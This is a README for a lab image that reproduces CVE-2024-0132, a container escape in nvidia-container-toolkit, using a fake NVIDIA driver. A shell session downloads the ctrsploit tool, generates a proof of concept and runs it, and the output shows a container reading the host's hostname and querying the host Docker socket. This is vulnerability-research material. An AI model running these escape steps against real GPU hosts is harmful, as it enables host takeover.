# nvidia-container-toolkit cve-2024-0132

* dqd:
  * ssst0n3/docker_archive:cve-2024-0132 -> ssst0n3/docker_archive:cve-2024-0132_v0.1.0
  * ssst0n3/docker_archive:cve-2024-0132_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_cve-2024-0132 -> ssst0n3/docker_archive:ctr_cve-2024-0132_v0.1.0
  * ssst0n3/docker_archive:ctr_cve-2024-0132_v0.1.0

## usage

```shell
$ cd vul/cve-2024-0132
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

### reproduce

```shell
$ ./ssh
root@cve-2024-0132:~# wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
root@cve-2024-0132:~# ctrsploit vul 0132 c
[Y]  cve-2024-0132	# nvidia-container-toolkit CVE-2024-0132 container escape. Affected versions: libnvidia-container >= 1.0.0, <= 1.16.1
root@cve-2024-0132:~# ctrsploit vul 0132 x
INFO[0000] exploit generated in poc-cve-2024-0132 directory, build it and push it to your registry 
root@cve-2024-0132:~# ls -lah poc-cve-2024-0132/
total 16K
drwxr-xr-x 2 root root 4.0K Sep  8 09:21 .
drwx------ 5 root root 4.0K Sep  8 09:21 ..
-rw-r--r-- 1 root root  624 Sep  8 09:21 Dockerfile
-rwxr-xr-x 1 root root  229 Sep  8 09:21 entrypoint.sh
root@cve-2024-0132:~# cd poc-cve-2024-0132/
root@cve-2024-0132:~/poc-cve-2024-0132# docker build -t poc .
root@cve-2024-0132:~/poc-cve-2024-0132# docker run -ti --runtime=nvidia --gpus=all poc
+ cat /host/etc/hostname
cve-2024-0132
+ curl --unix-socket /host-run/docker.sock http://localhost/containers/json
[]
```

### fake-nvidia

```shell
root@cve-2024-0132:~# nvidia-container-cli info
NVRM version:   575.57.08
CUDA version:   12.2

Device Index:   0
Device Minor:   0
Model:          NVIDIA Tesla T4
Brand:          Tesla
GPU UUID:       GPU-0-FAKE-UUID
Bus Location:   00000000:00:00.0
Architecture:   7.5

Device Index:   1
Device Minor:   1
Model:          NVIDIA Tesla T4
Brand:          Tesla
GPU UUID:       GPU-1-FAKE-UUID
Bus Location:   00000000:00:00.0
Architecture:   7.5

Device Index:   2
Device Minor:   2
Model:          NVIDIA Tesla T4
Brand:          Tesla
GPU UUID:       GPU-2-FAKE-UUID
Bus Location:   00000000:00:00.0
Architecture:   7.5

Device Index:   3
Device Minor:   3
Model:          NVIDIA Tesla T4
Brand:          Tesla
GPU UUID:       GPU-3-FAKE-UUID
Bus Location:   00000000:00:00.0
Architecture:   7.5
root@cve-2024-0132:~# lsmod |grep fake
fake_nvidia_driver     12288  0
root@cve-2024-0132:~# ls -lah /usr/lib/x86_64-linux-gnu/libnvidia-ml.so*
lrwxrwxrwx 1 root root  43 Jul 31 02:41 /usr/lib/x86_64-linux-gnu/libnvidia-ml.so -> /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1
lrwxrwxrwx 1 root root  51 Jul 31 02:41 /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1 -> /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.575.57.08
-rwxr-xr-x 1 root root 22K Jul 31 02:41 /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.575.57.08
root@cve-2024-0132:~# systemctl status fake-nvidia-device
â—‹ fake-nvidia-device.service - Create device nodes for fake nvidia driver
     Loaded: loaded (/etc/systemd/system/fake-nvidia-device.service; enabled; preset: enabled)
     Active: inactive (dead) since Mon 2025-09-08 09:17:31 UTC; 31s ago
    Process: 622 ExecStart=/usr/local/bin/fake-nvidia-device.sh (code=exited, status=0/SUCCESS)
   Main PID: 622 (code=exited, status=0/SUCCESS)
        CPU: 7ms

Sep 08 09:17:31 cve-2024-0132 systemd[1]: Starting fake-nvidia-device.service - Create device nodes for fake nvidia driver...
Sep 08 09:17:31 cve-2024-0132 systemd[1]: fake-nvidia-device.service: Deactivated successfully.
Sep 08 09:17:31 cve-2024-0132 systemd[1]: Finished fake-nvidia-device.service - Create device nodes for fake nvidia driver.
```

### env details

```shell
$ ./ssh
root@cve-2024-0132:~# nvidia-container-toolkit --version
NVIDIA Container Runtime Hook version 1.16.1
commit: a470818ba7d9166be282cd0039dd2fc9b0a34d73
root@cve-2024-0132:~# docker info
Client: Docker Engine - Community
 Version:    27.1.0
 Context:    default
 Debug Mode: false
 Plugins:
  buildx: Docker Buildx (Docker Inc.)
    Version:  v0.16.1
    Path:     /usr/libexec/docker/cli-plugins/docker-buildx
  compose: Docker Compose (Docker Inc.)
    Version:  v2.29.0
    Path:     /usr/libexec/docker/cli-plugins/docker-compose

Server:
 Containers: 0
  Running: 0
  Paused: 0
  Stopped: 0
 Images: 0
 Server Version: 27.1.0
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Using metacopy: false
  Native Overlay Diff: true
  userxattr: false
 Logging Driver: json-file
 Cgroup Driver: systemd
 Cgroup Version: 2
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local splunk syslog
 Swarm: inactive
 Runtimes: io.containerd.runc.v2 nvidia runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fc6bcff51318944179630522a095cc9dbf9f353
 runc version: v1.1.13-0-g58aa920
 init version: de40ad0
 Security Options:
  apparmor
  seccomp
   Profile: builtin
  cgroupns
 Kernel Version: 6.8.0-71-generic
 Operating System: Ubuntu 24.04.2 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.922GiB
 Name: cve-2024-0132
 ID: 6b674421-6458-4a13-8704-63c7441000e8
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

root@cve-2024-0132:~# containerd --version
containerd containerd.io 1.7.20 8fc6bcff51318944179630522a095cc9dbf9f353
```

## build

```shell
make all DIR=vul/cve-2024-0132
```

for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_cve-2024-0132_v0.1.0
```
